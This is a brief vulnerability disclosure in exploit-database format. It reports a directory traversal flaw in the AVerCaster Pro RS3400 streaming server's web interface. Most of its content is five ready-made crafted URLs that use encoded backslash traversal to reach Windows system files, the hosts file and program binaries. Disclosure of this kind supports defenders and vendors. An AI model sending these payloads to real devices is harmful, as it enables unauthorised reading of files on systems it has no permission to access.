@@ -1,0 +1,27 @@
+# Exploit Title: AVerCaster Pro RS3400 web server directory traversal
+# Date: 2012-10-06
+# Exploit Author: Patrick Saladino
+# Vendor Homepage: http://www.avermedia.com/product/ProductDetail.aspx?Id=560
+# Version: v.3.1.20
+# Tested on: Not relevant
+# CVE : none yet
+
+Hello,
+
+I just wanted to let you know that the latest video-streaming solution from AVerMedia, the AVerCaster Pro RS3400, is vulnerable to a nasty directory traversal bug. The whole filesystem (at least the locations accessible to the user running the web service) can easily be reached from the web using a crafted URL, such as :
+
+http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem.ini
+
+http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+
+http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+
+http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../windows/Starter.xml (Windows 7)
+
+http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../Program%20Files/Internet%20Explorer/iexplore.exe
+
+While no system files can be downloaded using that flaw, it's still bad programming...
+
+Cheers,
+
+Patrick
